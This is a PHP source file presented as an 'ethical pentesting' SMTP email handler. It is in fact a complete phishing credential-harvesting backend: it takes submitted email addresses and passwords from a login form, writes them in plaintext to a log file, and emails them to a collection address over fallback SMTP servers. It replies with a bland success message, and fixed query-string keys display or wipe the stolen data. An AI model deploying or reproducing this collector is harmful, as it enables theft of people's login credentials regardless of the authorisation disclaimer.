<?php
/**
 * Advanced SMTP Email Handler for Ethical Pentesting
 * Enhanced version with multiple SMTP server support and advanced features
 * 
 * IMPORTANT: This script is for authorized penetration testing only.
 * Ensure you have proper authorization before using this tool.
 */

// Configuration
$config = [
    'smtp_servers' => [
        ['host' => 'localhost', 'port' => 25],
        ['host' => '127.0.0.1', 'port' => 25],
        // Add more SMTP servers as needed
    ],
    'smtp_timeout' => 30,
    'from_email' => 'noreply@test.local',
    'to_emails' => ['admin@test.local'], // Multiple recipients
    'subject_prefix' => '[PENTEST]',
    'log_file' => 'pentest_log.txt',
    'max_log_size' => 5 * 1024 * 1024, // 5MB
    'enable_email' => true,
    'enable_logging' => true,
    'max_attempts_per_ip' => 10,
    'rate_limit_window' => 3600, // 1 hour
];

/**
 * Advanced SMTP client with authentication support
 */
class AdvancedSMTP {
    private $socket;
    private $server;
    private $port;
    private $timeout;
    private $username;
    private $password;
    private $use_auth;
    
    public function __construct($server, $port = 25, $timeout = 30, $username = null, $password = null) {
        $this->server = $server;
        $this->port = $port;
        $this->timeout = $timeout;
        $this->username = $username;
        $this->password = $password;
        $this->use_auth = !empty($username) && !empty($password);
    }
    
    public function connect() {
        $this->socket = @fsockopen($this->server, $this->port, $errno, $errstr, $this->timeout);
        if (!$this->socket) {
            throw new Exception("SMTP Connection failed to {$this->server}:{$this->port} - $errstr ($errno)");
        }
        
        // Set socket timeout
        stream_set_timeout($this->socket, $this->timeout);
        
        // Read server greeting
        $response = $this->readResponse();
        if (!$this->checkResponse($response, '220')) {
            throw new Exception("SMTP Server not ready: $response");
        }
        
        return true;
    }
    
    private function readResponse() {
        $response = '';
        while (($line = fgets($this->socket, 512)) !== false) {
            $response .= $line;
            if (substr($line, 3, 1) === ' ') {
                break;
            }
        }
        return trim($response);
    }
    
    private function checkResponse($response, $expected_code) {
        return substr($response, 0, 3) === $expected_code;
    }
    
    public function sendCommand($command, $expected_code = '250') {
        fputs($this->socket, $command . "\r\n");
        $response = $this->readResponse();
        
        if (!$this->checkResponse($response, $expected_code)) {
            throw new Exception("SMTP Command failed: $command - Response: $response");
        }
        
        return $response;
    }
    
    public function authenticate() {
        if (!$this->use_auth) {
            return true;
        }
        
        try {
            // Try EHLO first for extended SMTP
            $this->sendCommand("EHLO " . gethostname());
            
            // Start authentication
            $this->sendCommand("AUTH LOGIN", '334');
            $this->sendCommand(base64_encode($this->username), '334');
            $this->sendCommand(base64_encode($this->password));
            
            return true;
        } catch (Exception $e) {
            // Fall back to HELO if EHLO fails
            $this->sendCommand("HELO " . gethostname());
            return false; // No auth available
        }
    }
    
    public function sendEmail($from, $to, $subject, $message, $headers = []) {
        try {
            // Authenticate if needed
            $this->authenticate();
            
            // MAIL FROM
            $this->sendCommand("MAIL FROM: <$from>");
            
            // RCPT TO (support multiple recipients)
            if (is_array($to)) {
                foreach ($to as $recipient) {
                    $this->sendCommand("RCPT TO: <$recipient>");
                }
            } else {
                $this->sendCommand("RCPT TO: <$to>");
            }
            
            // DATA
            $this->sendCommand("DATA", '354');
            
            // Email headers and body
            $email_data = "From: $from\r\n";
            if (is_array($to)) {
                $email_data .= "To: " . implode(', ', $to) . "\r\n";
            } else {
                $email_data .= "To: $to\r\n";
            }
            $email_data .= "Subject: $subject\r\n";
            $email_data .= "Date: " . date('r') . "\r\n";
            $email_data .= "Content-Type: text/html; charset=UTF-8\r\n";
            $email_data .= "X-Mailer: PentestSMTP/1.0\r\n";
            
            // Add custom headers
            foreach ($headers as $header => $value) {
                $email_data .= "$header: $value\r\n";
            }
            
            $email_data .= "\r\n";
            $email_data .= $message . "\r\n";
            $email_data .= ".";
            
            $this->sendCommand($email_data);
            
            return true;
            
        } catch (Exception $e) {
            throw $e;
        }
    }
    
    public function quit() {
        if ($this->socket) {
            try {
                fputs($this->socket, "QUIT\r\n");
            } catch (Exception $e) {
                // Ignore errors during quit
            }
            fclose($this->socket);
        }
    }
}

/**
 * Rate limiting functionality
 */
class RateLimiter {
    private $file;
    
    public function __construct($file = 'rate_limit.json') {
        $this->file = $file;
    }
    
    public function checkLimit($ip, $max_attempts, $window) {
        $data = $this->loadData();
        $current_time = time();
        
        // Clean old entries
        foreach ($data as $stored_ip => $info) {
            if ($current_time - $info['first_attempt'] > $window) {
                unset($data[$stored_ip]);
            }
        }
        
        // Check current IP
        if (!isset($data[$ip])) {
            $data[$ip] = ['count' => 1, 'first_attempt' => $current_time];
        } else {
            $data[$ip]['count']++;
        }
        
        $this->saveData($data);
        
        return $data[$ip]['count'] <= $max_attempts;
    }
    
    private function loadData() {
        if (file_exists($this->file)) {
            $content = file_get_contents($this->file);
            return json_decode($content, true) ?: [];
        }
        return [];
    }
    
    private function saveData($data) {
        file_put_contents($this->file, json_encode($data), LOCK_EX);
    }
}

/**
 * Enhanced logging with rotation
 */
function logData($data, $type = 'form_submission') {
    global $config;
    
    if (!$config['enable_logging']) {
        return;
    }
    
    $log_file = $config['log_file'];
    $max_log_size = $config['max_log_size'];
    
    // Rotate log if too large
    if (file_exists($log_file) && filesize($log_file) > $max_log_size) {
        rename($log_file, $log_file . '.' . date('Y-m-d-H-i-s') . '.old');
    }
    
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $referer = $_SERVER['HTTP_REFERER'] ?? 'Unknown';
    
    $log_entry = [
        'timestamp' => $timestamp,
        'type' => $type,
        'ip' => $ip,
        'user_agent' => $user_agent,
        'referer' => $referer,
        'data' => $data
    ];
    
    file_put_contents($log_file, json_encode($log_entry) . "\n", FILE_APPEND | LOCK_EX);
}

/**
 * Sanitize input data
 */
function sanitizeInput($input) {
    if (is_array($input)) {
        return array_map('sanitizeInput', $input);
    }
    return htmlspecialchars(strip_tags(trim($input)), ENT_QUOTES, 'UTF-8');
}

/**
 * Validate email format
 */
function validateEmail($email) {
    return filter_var($email, FILTER_VALIDATE_EMAIL) !== false;
}

/**
 * Generate enhanced HTML email content
 */
function generateEmailContent($form_data) {
    global $config;
    
    $html = "<!DOCTYPE html><html><head>";
    $html .= "<title>Pentesting Alert</title>";
    $html .= "<style>";
    $html .= "body { font-family: Arial, sans-serif; margin: 20px; }";
    $html .= "table { border-collapse: collapse; width: 100%; }";
    $html .= "th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }";
    $html .= "th { background-color: #f2f2f2; }";
    $html .= ".alert { background-color: #ffebee; border: 1px solid #f44336; padding: 10px; margin: 10px 0; }";
    $html .= "</style>";
    $html .= "</head><body>";
    
    $html .= "<div class='alert'>";
    $html .= "<h2>🚨 Pentesting Form Submission Alert</h2>";
    $html .= "</div>";
    
    $html .= "<h3>Session Information</h3>";
    $html .= "<table>";
    $html .= "<tr><th>Timestamp</th><td>" . date('Y-m-d H:i:s T') . "</td></tr>";
    $html .= "<tr><th>IP Address</th><td>" . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "</td></tr>";
    $html .= "<tr><th>User Agent</th><td>" . htmlspecialchars($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . "</td></tr>";
    $html .= "<tr><th>Referer</th><td>" . htmlspecialchars($_SERVER['HTTP_REFERER'] ?? 'Unknown') . "</td></tr>";
    $html .= "<tr><th>Request Method</th><td>" . $_SERVER['REQUEST_METHOD'] . "</td></tr>";
    $html .= "</table>";
    
    $html .= "<h3>Form Data Captured</h3>";
    $html .= "<table>";
    $html .= "<tr><th>Field</th><th>Value</th></tr>";
    foreach ($form_data as $key => $value) {
        $html .= "<tr><td><strong>" . htmlspecialchars($key) . "</strong></td>";
        $html .= "<td>" . htmlspecialchars($value) . "</td></tr>";
    }
    $html .= "</table>";
    
    $html .= "<h3>Security Analysis</h3>";
    $html .= "<table>";
    $html .= "<tr><th>Email Valid</th><td>" . (validateEmail($form_data['userid'] ?? '') ? 'Yes' : 'No') . "</td></tr>";
    $html .= "<tr><th>Password Length</th><td>" . strlen($form_data['userpwd'] ?? '') . " characters</td></tr>";
    $html .= "<tr><th>Remember Me</th><td>" . (isset($form_data['rememberme']) ? 'Checked' : 'Not checked') . "</td></tr>";
    $html .= "</table>";
    
    $html .= "<hr>";
    $html .= "<p><em>This is an automated message from the authorized pentesting system.</em></p>";
    $html .= "<p><small>Generated at: " . date('c') . "</small></p>";
    $html .= "</body></html>";
    
    return $html;
}

/**
 * Try multiple SMTP servers
 */
function sendEmailViaSMTP($form_data) {
    global $config;
    
    $subject = $config['subject_prefix'] . ' Form Submission - ' . date('Y-m-d H:i:s');
    $email_content = generateEmailContent($form_data);
    
    foreach ($config['smtp_servers'] as $server_config) {
        try {
            $smtp = new AdvancedSMTP(
                $server_config['host'], 
                $server_config['port'], 
                $config['smtp_timeout']
            );
            
            $smtp->connect();
            $smtp->sendEmail(
                $config['from_email'], 
                $config['to_emails'], 
                $subject, 
                $email_content
            );
            $smtp->quit();
            
            logData([
                'type' => 'email_sent_success',
                'server' => $server_config['host'] . ':' . $server_config['port'],
                'recipients' => $config['to_emails']
            ]);
            
            return true;
            
        } catch (Exception $e) {
            logData([
                'type' => 'email_send_failed',
                'server' => $server_config['host'] . ':' . $server_config['port'],
                'error' => $e->getMessage()
            ]);
            
            // Continue to next server
            continue;
        }
    }
    
    return false;
}

/**
 * Check rate limiting
 */
function checkRateLimit($ip) {
    global $config;
    
    $rate_limiter = new RateLimiter();
    return $rate_limiter->checkLimit(
        $ip, 
        $config['max_attempts_per_ip'], 
        $config['rate_limit_window']
    );
}

/**
 * Generate detailed statistics
 */
function generateStats() {
    global $config;
    
    if (!file_exists($config['log_file'])) {
        return "No log data available.";
    }
    
    $lines = file($config['log_file'], FILE_IGNORE_NEW_LINES);
    $stats = [
        'total_submissions' => 0,
        'unique_ips' => [],
        'email_domains' => [],
        'user_agents' => [],
        'hourly_distribution' => [],
    ];
    
    foreach ($lines as $line) {
        $data = json_decode($line, true);
        if ($data && $data['type'] === 'form_submission') {
            $stats['total_submissions']++;
            $stats['unique_ips'][$data['ip']] = ($stats['unique_ips'][$data['ip']] ?? 0) + 1;
            
            if (isset($data['data']['userid'])) {
                $domain = substr(strrchr($data['data']['userid'], '@'), 1);
                $stats['email_domains'][$domain] = ($stats['email_domains'][$domain] ?? 0) + 1;
            }
            
            $hour = date('H', strtotime($data['timestamp']));
            $stats['hourly_distribution'][$hour] = ($stats['hourly_distribution'][$hour] ?? 0) + 1;
        }
    }
    
    $html = "<h2>Pentesting Statistics</h2>";
    $html .= "<p><strong>Total Submissions:</strong> {$stats['total_submissions']}</p>";
    $html .= "<p><strong>Unique IPs:</strong> " . count($stats['unique_ips']) . "</p>";
    
    if (!empty($stats['email_domains'])) {
        $html .= "<h3>Top Email Domains</h3><ul>";
        arsort($stats['email_domains']);
        foreach (array_slice($stats['email_domains'], 0, 10, true) as $domain => $count) {
            $html .= "<li>$domain: $count submissions</li>";
        }
        $html .= "</ul>";
    }
    
    return $html;
}

// Main processing logic
try {
    // Security headers
    header('X-Content-Type-Options: nosniff');
    header('X-Frame-Options: DENY');
    header('X-XSS-Protection: 1; mode=block');
    
    // Get client IP
    $client_ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    
    // Handle different request types
    if (isset($_GET['stats']) && $_GET['stats'] === 'authorized_access_only') {
        echo generateStats();
        exit;
    }
    
    if (isset($_GET['view_log']) && $_GET['view_log'] === 'authorized_access_only') {
        if (file_exists($config['log_file'])) {
            echo "<h2>Pentesting Log</h2>";
            echo "<pre>" . htmlspecialchars(file_get_contents($config['log_file'])) . "</pre>";
        } else {
            echo "No log file found.";
        }
        exit;
    }
    
    if (isset($_GET['clear_log']) && $_GET['clear_log'] === 'authorized_access_only') {
        if (file_exists($config['log_file'])) {
            unlink($config['log_file']);
            echo "Log cleared.";
        } else {
            echo "No log file to clear.";
        }
        exit;
    }
    
    // Handle POST requests (form submissions)
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        // Rate limiting check
        if (!checkRateLimit($client_ip)) {
            logData(['type' => 'rate_limit_exceeded', 'ip' => $client_ip]);
            http_response_code(429);
            echo json_encode(['status' => 'error', 'message' => 'Rate limit exceeded']);
            exit;
        }
        
        // Collect and sanitize form data
        $form_data = [];
        foreach ($_POST as $key => $value) {
            if ($key !== 'website') { // Skip honeypot field
                $form_data[sanitizeInput($key)] = sanitizeInput($value);
            }
        }
        
        // Check honeypot field (anti-bot measure)
        if (!empty($_POST['website'])) {
            logData(['type' => 'bot_attempt', 'honeypot' => $_POST['website']]);
            http_response_code(400);
            echo json_encode(['status' => 'error', 'message' => 'Invalid request']);
            exit;
        }
        
        // Validate required fields
        if (empty($form_data['userid']) || empty($form_data['userpwd'])) {
            throw new Exception('Required fields missing');
        }
        
        // Validate email format
        if (!validateEmail($form_data['userid'])) {
            throw new Exception('Invalid email format');
        }
        
        // Log the form submission
        logData($form_data, 'form_submission');
        
        // Send email notification if enabled
        if ($config['enable_email']) {
            try {
                $email_sent = sendEmailViaSMTP($form_data);
                if (!$email_sent) {
                    logData(['type' => 'all_smtp_servers_failed']);
                }
            } catch (Exception $e) {
                logData(['type' => 'email_system_error', 'error' => $e->getMessage()]);
            }
        }
        
        // Return success response
        http_response_code(200);
        echo json_encode([
            'status' => 'success', 
            'message' => 'Data processed successfully',
            'timestamp' => date('c')
        ]);
        
    } else {
        // Handle non-POST requests
        http_response_code(405);
        echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
    }
    
} catch (Exception $e) {
    // Log error
    logData(['type' => 'system_error', 'message' => $e->getMessage()]);
    
    // Return error response
    http_response_code(500);
    echo json_encode(['status' => 'error', 'message' => 'Internal server error']);
}

/**
 * Cleanup function for old log files
 */
function cleanupOldLogs($days = 30) {
    $pattern = dirname(__FILE__) . '/pentest_log.txt.*.old';
    $files = glob($pattern);
    $cutoff = time() - ($days * 24 * 60 * 60);
    
    foreach ($files as $file) {
        if (filemtime($file) < $cutoff) {
            unlink($file);
        }
    }
}

// Run cleanup periodically
if (random_int(1, 100) === 1) {
    cleanupOldLogs();
}
?>